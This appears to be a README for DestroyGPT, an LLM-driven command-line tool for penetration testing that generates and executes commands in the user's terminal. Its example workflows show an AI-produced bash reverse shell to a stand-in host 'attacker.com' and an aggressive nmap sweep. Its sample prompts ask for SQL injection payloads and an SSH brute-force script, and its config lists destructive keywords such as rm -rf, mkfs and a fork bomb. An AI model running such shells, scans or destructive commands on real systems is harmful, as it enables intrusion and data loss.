# 🛡️ DestroyGPT

AI-Powered CLI for Ethical Hacking with Safe Command Execution

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
[![OpenRouter API](https://img.shields.io/badge/OpenRouter-Integrated-green.svg)](https://openrouter.ai)
[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://github.com/sujallamichhane18/DestroyGPT/pulls)

---

## 📺 Demo

![DestroyGPT Demo](assets/demo.gif)

> Add a GIF demo of the tool in action. Upload screen recording to `assets/demo.gif`

---

## 🎯 Overview

DestroyGPT is a secure, AI-assisted terminal tool designed for penetration testers and ethical hackers. It integrates with OpenRouter.ai to leverage advanced language models—DeepSeek-R1, GPT-4o, Grok—for generating security commands, payloads, and exploit strategies.

The tool enables direct command execution in your terminal while enforcing multi-layered security mechanisms to prevent accidental or malicious damage.

---

## 🚀 Quick Start

### 📋 Prerequisites

- Python 3.8+
- pip package manager
- Git
- (Optional) Docker for sandbox mode

### 💾 Installation

```bash
# Clone repository
git clone https://github.com/sujallamichhane18/DestroyGPT.git
cd DestroyGPT

# Install dependencies
pip install -r requirements.txt
```

### 🔑 API Configuration

Get your API key from [OpenRouter.ai](https://openrouter.ai)

**Option 1: Secure File Storage** (Recommended)
```bash
echo "sk_openrouter_your_api_key_here" > ~/.destroygpt_api_key
chmod 600 ~/.destroygpt_api_key
```

**Option 2: Environment Variable**
```bash
export OPENROUTER_API_KEY="sk_openrouter_your_api_key_here"
```

### ▶️ Launch

```bash
python destroygpt_advanced.py
```

---

## 📖 Usage Guide

### 🎮 Interactive Mode

```bash
DestroyGPT >>> help
DestroyGPT >>> Generate a payload for SQL injection testing
DestroyGPT >>> List all open ports on my network
DestroyGPT >>> Create a brute-force script for SSH
```

### 🛠️ Special Commands

| Command | Description |
|---------|-------------|
| `cmd: <command>` | Execute system command directly |
| `help` | Show available commands |
| `history` | View command history |
| `clear` | Clear screen |
| `exit` / `quit` | Terminate session |
| `dry-run <command>` | Preview without executing |

### 💡 Example Workflows

**Port Scanning:**
```
DestroyGPT >>> Generate an aggressive nmap scan on 192.168.1.0/24
AI Response: nmap -sS -sV -O -p- 192.168.1.0/24
✓ Command approved and executed
```

**Payload Generation:**
```
DestroyGPT >>> Create a reverse shell payload for Linux
AI Response: bash -i >& /dev/tcp/attacker.com/4444 0>&1
⚠️ Danger Keywords Detected - Manual Confirmation Required
Proceed? (y/N) y
```

---

## 🛡️ Security

DestroyGPT implements defense-in-depth security with multiple protective layers:

- **Whitelist Enforcement** – Only approved tools are permitted
- **Blacklist Detection** – Dangerous patterns are automatically blocked
- **Keyword Analysis** – Sensitive commands trigger manual confirmation
- **Docker Sandbox** – Optional isolated container execution
- **Timeout Protection** – Auto-terminates long-running processes
- **Comprehensive Logging** – Full audit trail of all activities

---

## ⚙️ Configuration

Create a `config.json` for advanced settings:

```json
{
  "model": "gpt-4o",
  "api_timeout": 30,
  "execution_timeout": 300,
  "max_history": 5000,
  "docker_enabled": false,
  "log_retention_days": 30,
  "whitelist": ["nmap", "curl", "ssh", "dig"],
  "danger_keywords": ["rm -rf", "mkfs", ":(){ :|:& };:"]
}
```

---

## 🐛 Troubleshooting

**API Key Not Found**
```bash
✗ Error: OPENROUTER_API_KEY not configured
✓ Solution: Set ~/.destroygpt_api_key or export OPENROUTER_API_KEY
```

**Docker Sandbox Unavailable**
```bash
⚠️  Warning: Docker not detected. Sandbox mode disabled.
✓ Solution: Install Docker or disable sandbox requirement
```

**Command Timeout**
```bash
⏱️  Timeout: Command exceeded 300 seconds
✓ Solution: Increase execution_timeout in config.json
```

---

## ⚠️ Legal & Ethical Notice

This tool is **exclusively for authorized penetration testing, legitimate security research, and educational purposes**.

**Unauthorized access to computer systems is illegal** and subject to criminal penalties. By using DestroyGPT, you agree to use it only for authorized activities and comply with all applicable laws and regulations in your jurisdiction.

The author assumes no liability for misuse or any resulting damages.

---

## 📜 License

Licensed under the **MIT License** – see [LICENSE](LICENSE) for full details.

---

## 🔗 Resources & Links

- 🌐 [OpenRouter.ai](https://openrouter.ai) – LLM API
- 📖 [Documentation](https://github.com/sujallamichhane18/DestroyGPT/wiki)
- 🐛 [Report Issues](https://github.com/sujallamichhane18/DestroyGPT/issues)
- 💬 [Discussions](https://github.com/sujallamichhane18/DestroyGPT/discussions)

---

## 🤝 Contributing

We welcome contributions! Please:

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Commit changes (`git commit -m 'Add amazing feature'`)
4. Push to branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

---

**Built for ethical hackers and security professionals. Use responsibly.**
